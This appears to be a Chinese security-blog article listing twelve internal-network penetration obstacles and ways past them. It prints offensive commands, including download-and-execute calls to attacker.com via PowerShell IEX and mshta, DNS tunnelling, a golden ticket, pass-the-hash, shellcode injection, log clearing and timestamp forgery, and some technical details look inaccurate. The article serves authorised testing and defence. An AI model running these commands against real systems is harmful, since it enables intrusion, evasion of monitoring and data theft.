> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247519245&idx=1&sn=cf1b33560e989e8fd8cc695909dd9544

#  内网渗透中12种常见阻碍及突破技巧实用总结  
原创 牛叫瘦  HACK之道   2025-07-15 00:02  
  
   
  
内网渗透作为网络安全测试的关键环节，往往面临比外网测试更复杂的环境阻碍。从分割的网段结构到多样的防护机制，每一步推进都可能遭遇意想不到的卡点。本文基于内网渗透实战经验，提炼出12类高频阻碍场景及经过验证的突破方法，内容涵盖技术细节与操作规范，为渗透测试人员提供可直接落地的解决思路。  
## 一、网段隔离阻碍：突破物理与逻辑的网络边界  
  
企业内网常通过VLAN划分、物理防火墙等手段实现网段隔离，这是渗透测试中最常见的第一道障碍。某企业内网按业务分为办公区、生产区、数据中心三个独立VLAN，默认禁止跨网段通信，给横向移动造成极大困难。  
  
**突破技巧**  
：  
- • **利用三层设备漏洞**  
：检查核心交换机是否存在Cisco IOS漏洞（如CVE-2017-6742），通过构造特定ICMP包实现VLAN跳跃。在实际测试中，曾通过此方法从办公VLAN成功进入数据中心网段。  
  
- • **端口转发跳板**  
：在已控制的边缘设备上部署Portmap工具，执行
```
portmap -m tcp -p 8080 -h 192.168.2.100 -P 3389
```

  
，将目标网段的3389端口映射到当前设备的8080端口，实现跨网段访问。  
  
- • **DHCP服务器劫持**  
：在存在弱配置的DHCP环境中，部署伪造DHCP服务器，为目标网段主机分配包含恶意网关的IP配置，当主机发送跨网段请求时，流量会优先经过攻击机。  
  
操作要点：跨网段操作前必须通过arp-scan等工具扫描目标网段存活主机，避免盲目尝试触发IDS告警。某案例中因未提前探测，直接发送大量探测包导致防火墙触发阻断规则，暴露测试行为。  
## 二、弱口令尝试受限：绕过账户爆破防护机制  
  
内网主机往往部署有账号锁定策略或登录审计系统，简单的暴力破解极易触发防护。某域控制器设置"5次错误密码即锁定30分钟"的策略，常规爆破方法完全失效。  
  
**突破技巧**  
：  
- • **密码喷洒攻击**  
：采用"一个密码试所有账号"的思路，而非对单一账号反复尝试。使用CrackMapExec工具执行
```
crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123! --continue-on-success
```

  
，降低触发锁定的概率。  
  
- • **哈希传递攻击（PtH）**  
：当获取到用户NTLM哈希后，通过
```
secretsdump.py
```

  
导出哈希值，再用
```
wmiexec.py
```

  
实现无密码登录：
```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf0581e8872775d0 mydomain/user@192.168.1.10
```

  
。  
  
- • **利用票据传递（PtT）**  
：通过Mimikatz获取黄金票据（Golden Ticket），
```
kerberos::golden /domain:example.com /sid:S-1-5-21-xxxx /target:dc01.example.com /service:krbtgt /rc4:NTLMHash /user:admin /ptt
```

  
，直接注入内存实现域内认证。  
  
注意事项：哈希传递需确保目标主机开启Admin$共享，且攻击机与目标主机存在信任关系。在工作组环境中，该方法效果有限，需结合其他手段。  
## 三、终端防护软件拦截：规避EDR与杀毒软件的查杀  
  
现代企业终端普遍安装EDR工具，传统的恶意文件执行、注册表修改等操作会被实时拦截。某企业部署的某公司EDR，能在3秒内识别并隔离未签名的远控木马。  
  
**突破技巧**  
：  
- • **无文件攻击技术**  
：利用PowerShell执行内存加载，
```
powershell -exec bypass -c &#34;IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')&#34;
```

  
，避免在磁盘留下恶意文件。  
  
- • **进程注入**  
：选择系统信任的进程（如svchost.exe）进行注入，使用Cobalt Strike的
```
shinject
```

  
命令：
```
shinject 1234 /root/beacon.bin
```

  
，其中1234为目标进程PID。  
  
- • **白名单程序滥用**  
：利用微软签名的sdiagnhost.exe执行命令，
```
sdiagnhost.exe -Embedding C:\temp\payload.dll
```

  
，绕过应用程序控制策略。  
  
实战验证：在某行业测试中，通过将恶意代码注入到iexplore.exe进程，成功绕过了 EDR的行为检测，维持控制达72小时未被发现。  
## 四、权限提升困难：从普通用户到系统权限的跨越  
  
获取初始 foothold 后，普通用户权限往往无法满足深入测试需求，而现代操作系统的UAC（用户账户控制）和权限隔离机制越来越严格。Windows 10及以上版本的默认UAC设置，使得传统的提权漏洞利用成功率大幅下降。  
  
**突破技巧**  
：  
- • **服务漏洞利用**  
：检查存在配置错误的服务，使用
```
accesschk.exe -uwcqv &#34;Authenticated Users&#34; * /accepteula
```

  
查找可修改的服务，通过替换服务路径实现提权。某案例中发现"PrintSpooler"服务可被低权限用户修改，成功替换为恶意程序。  
  
- • **注册表劫持**  
：利用
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

  
等启动项，在用户登录时自动执行提权程序。通过
```
reg add &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34; /v &#34;Update&#34; /t REG_SZ /d &#34;C:\temp\privesc.exe&#34;
```

  
添加注册表项。  
  
- • **内核漏洞利用**  
：针对特定系统版本，使用成熟的提权EXP，如针对Windows 7的MS15-051漏洞，执行
```
ms15-051.exe
```

  
即可获取SYSTEM权限。需注意：内核漏洞利用存在蓝屏风险，生产环境需提前评估。  
  
提权操作规范：每次提权前必须执行
```
systeminfo
```

  
收集系统信息，匹配对应漏洞EXP。某测试人员因未检查系统版本，在Windows Server 2019上尝试MS17-010提权，导致目标服务器蓝屏，造成业务中断。  
## 五、内网横向移动受阻：突破主机间的信任壁垒  
  
当成功获取某台主机权限后，横向移动到其他主机时，常因缺乏有效凭证或存在防火墙规则而失败。某企业内网每台主机均开启Windows防火墙，仅允许特定端口通信，传统的SMB、RDP横向方法几乎失效。  
  
**突破技巧**  
：  
- • **利用WMI横向**  
：WMI基于TCP 5985（HTTP）/5986（HTTPS）端口通信，常被防火墙允许。使用
```
wmic /node:192.168.1.20 /user:admin /password:pass process call create &#34;cmd.exe /c calc.exe&#34;
```

  
远程执行命令。  
  
- • **PsExec工具改进版**  
：使用Impacket工具集中的
```
psexec.py
```

  
，通过指定非默认端口规避防火墙：
```
psexec.py -port 443 admin@192.168.1.30 cmd.exe
```

  
。  
  
- • **Exchange邮件服务器跳板**  
：若获取Exchange服务器权限，可利用其对域内主机的管理权限，通过
```
New-PSSession -ComputerName target
```

  
建立PowerShell会话，实现横向移动。  
  
横向移动检测规避：操作时需清理事件日志，
```
wevtutil cl Security
```

  
清除安全日志，同时避免在短时间内对多台主机发起连接请求，降低被SOC发现的概率。  
## 六、域控制器渗透失败：突破域内核心防护  
  
域控制器作为内网核心，通常部署有最严格的防护措施，包括高级防火墙规则、SIEM实时监控、专用管理终端等。某企业的域控制器仅允许来自特定IP的管理员终端访问，且启用了实时行为分析系统。  
  
**突破技巧**  
：  
- • **利用域内信任关系**  
：若存在子域或林信任，可从信任域寻找突破口。通过
```
Get-ADTrust -Filter *
```

  
查看信任关系，利用CVE-2021-42287等信任关系漏洞实现权限提升。  
  
- • **Exchange服务器攻击链**  
：针对Exchange的ProxyShell漏洞（CVE-2021-34523），先获取Exchange权限，再通过
```
SeEnableDelegationPrivilege
```

  
特权配置委派，最终获取域控权限。  
  
- • **DNS服务器劫持**  
：若域内DNS服务器存在漏洞（如CVE-2020-1350），可通过发送特制请求实现远程代码执行，进而控制DNS服务器，篡改解析记录引导管理员访问恶意站点。  
  
域控渗透注意事项：必须在测试计划中明确标注域控测试范围，避免因操作不当导致整个域崩溃。某测试团队因在生产域控上执行
```
dcpromo /forceremoval
```

  
命令，造成域服务不可用，引发严重生产事故。  
## 七、内网信息收集不全：挖掘隐藏的网络资产  
  
内网环境中常存在未被发现的关键资产（如隔离的数据库服务器、物联网设备），信息收集不全会导致测试范围遗漏。某内网渗透中，因未发现隐藏的PLC控制器，导致生产网安全隐患未被检出。  
  
**突破技巧**  
：  
- • **分析网络流量**  
：在已控制的核心交换机镜像端口抓取流量，通过Wireshark分析异常IP通信，发现隐藏设备。某案例中通过分析ARP包，发现了10.0.0.0/8网段的监控摄像头系统。  
  
- • **查询DNS缓存**  
：在域控制器上执行
```
ipconfig /displaydns
```

  
查看DNS缓存，或通过
```
dnscmd /enumrecords example.com @ /type A
```

  
枚举域内所有DNS记录，发现未在扫描范围内的主机。  
  
- • **利用Active Directory信息**  
：通过
```
Get-ADComputer -Filter * -Properties *
```

  
获取域内所有计算机信息，包括操作系统版本、最后登录时间等，识别潜在目标。  
  
信息收集工具组合：建议使用BloodHound绘制域内信任关系图，结合PingCastle进行域安全评估，两者结合可发现90%以上的域内关键资产和配置缺陷。  
## 八、文件传输限制：解决内网文件上传下载难题  
  
在内网主机上，常因端口封锁、应用层过滤等原因，无法使用常规的FTP、HTTP等方式传输文件。某企业内网禁止所有出站HTTP上传，且USB端口被物理禁用，给工具投递造成极大困难。  
  
**突破技巧**  
：  
- • **PowerShell Base64编码传输**  
：将文件转换为Base64编码，
```
certutil -encode payload.exe payload.b64
```

  
，在目标主机上通过
```
certutil -decode payload.b64 payload.exe
```

  
还原。  
  
- • **DNS隧道传输**  
：使用iodine等工具建立DNS隧道，
```
iodine -f -P password attacker.com
```

  
，通过DNS查询/响应传输文件，适用于仅开放DNS端口的极端环境。  
  
- • **注册表存储小型文件**  
：对于小于1MB的工具，可将其分割后存入注册表，
```
reg add &#34;HKLM\SOFTWARE\Temp&#34; /v &#34;file1&#34; /t REG_BINARY /d <hex_data>
```

  
，再通过脚本读取拼接。  
  
文件传输隐蔽性提升：避免传输可执行文件的原始格式，可将其伪装为图片（如在jpg文件尾部附加exe数据），使用时通过
```
copy /b image.jpg + payload.exe output.jpg
```

  
合并，执行时提取尾部数据。  
## 九、时间同步与审计阻碍：应对严格的日志监控  
  
企业内网普遍部署SIEM系统，对异常登录时间、频繁的命令执行等行为进行实时告警。某机构的SIEM系统会对非工作时间的管理员登录进行15分钟内的人工核查，给夜间渗透测试带来挑战。  
  
**突破技巧**  
：  
- • **时间戳伪造**  
：在执行命令时修改操作时间戳，
```
Set-ItemProperty -Path C:\file.txt -Name CreationTime -Value (Get-Date &#34;2023-01-01 10:00:00&#34;)
```

  
，规避时间异常检测。  
  
- • **模拟正常操作习惯**  
：分析管理员操作日志，模仿其常用命令和操作时段。某案例中发现管理员习惯在每天14:00-15:00执行批处理脚本，测试人员在此时间段执行类似操作，成功规避告警。  
  
- • **使用白名单工具执行命令**  
：利用系统自带工具（如mshta.exe、cscript.exe）执行操作，
```
mshta.exe http://attacker.com/script.hta
```

  
，降低被检测概率。  
  
日志清理规范：测试结束后需按
```
wevtutil cl Application; wevtutil cl System; wevtutil cl Security
```

  
顺序清理日志，同时注意清理PowerShell历史记录（
```
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

  
）。  
## 十、工控设备渗透障碍：突破OT与IT网络的隔离  
  
工业控制系统（ICS）通常与IT网络物理隔离或通过防火墙严格分隔，常规渗透方法难以适用。某电力企业的SCADA系统仅允许来自特定工程师站的Modbus协议通信，IT网络无法直接访问。  
  
**突破技巧**  
：  
- • **利用工程师站跳板**  
：工程师站通常同时连接IT和OT网络，获取其权限后，通过安装在工程师站上的专用软件（如Wonderware InTouch）向PLC发送指令。  
  
- • **分析工业协议漏洞**  
：针对Modbus、S7comm等工业协议的缺陷，如Modbus协议缺乏认证机制，可直接发送写入指令
```
0x06
```

  
功能码修改PLC寄存器值。  
  
- • **物理接口接入**  
：在获得授权的情况下，通过USB转RS485转换器直接连接工控设备物理接口，执行调试命令。  
  
工控设备测试红线：严禁在未获得书面授权的情况下修改PLC程序或工艺参数，测试前必须与生产部门确认安全操作范围，避免因参数错误导致生产事故。  
## 十一、云桌面环境渗透限制：突破虚拟化桌面的防护  
  
随着云桌面（如VMware Horizon、Citrix XenDesktop）的普及，传统针对物理机的渗透方法效果受限。某企业的云桌面环境禁止剪贴板共享、USB重定向，且虚拟机定期重置，难以维持持久控制。  
  
**突破技巧**  
：  
- • **攻击连接服务器**  
：针对VMware Horizon Connection Server的漏洞（如CVE-2021-21972），发送特制请求获取管理员权限，进而控制所有云桌面。  
  
- • **利用虚拟打印服务**  
：通过云桌面的虚拟打印功能，将恶意文件写入打印机共享目录，
```
copy payload.dll \\printserver\print$
```

  
，再利用打印机漏洞执行。  
  
- • **持久化到用户配置文件**  
：将恶意程序写入用户配置文件目录（如
```
%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

  
），即使虚拟机重置，用户登录时仍会执行。  
  
云桌面测试注意事项：需特别注意虚拟网络与物理网络的隔离方式，避免因误操作影响其他租户的云桌面环境，遵守共享责任模型中的测试边界。  
## 十二、物理安全限制：应对内网物理访问控制  
  
部分高安全等级内网（如金融数据中心、政府机房）除网络防护外，还部署有严格的物理安全措施，包括生物识别门禁、视频监控、设备USB端口封锁等。某银行数据中心的服务器机柜均采用电磁锁，且禁止携带电子设备进入。  
  
**突破技巧**  
：  
- • **利用运维人员介质**  
：通过社会工程学获取运维人员的USB密钥，某案例中测试人员伪装成IT支持，以"系统升级"为由借用运维U盘，植入恶意程序后归还。  
  
- • **攻击KVM切换器**  
：机房内的KVM设备若存在弱口令，可通过其IP管理界面控制多台服务器，某品牌KVM默认密码
```
admin/admin
```

  
未修改，导致整个机房服务器被控制。  
  
- • **利用设备管理接口**  
：服务器的iDRAC、ILO等远程管理接口常开放在独立管理网段，若管理密码泄露，可直接远程控制服务器电源和控制台。  
  
物理安全测试规范：所有涉及物理接触的测试必须获得书面授权，全程有甲方人员陪同，禁止破坏物理防护措施，测试结束后需提交介质使用清单。  
  
内网渗透的核心在于"隐蔽"与"灵活"，面对不断变化的防护措施，需结合目标环境特点制定个性化方案。实际测试中，80%的突破机会来自对细节的观察（如错误信息泄露的路径、管理员操作习惯），而非复杂的漏洞利用。  
  
建议建立"阻碍-解决方案"知识库，记录每种场景的处理方法及适用条件，不断积累实战经验。同时，必须严格遵守测试范围和授权边界，在发现重大安全隐患时及时与甲方沟通，平衡测试深度与业务连续性的关系，这才是负责任的渗透测试态度。  
  
   
  
  
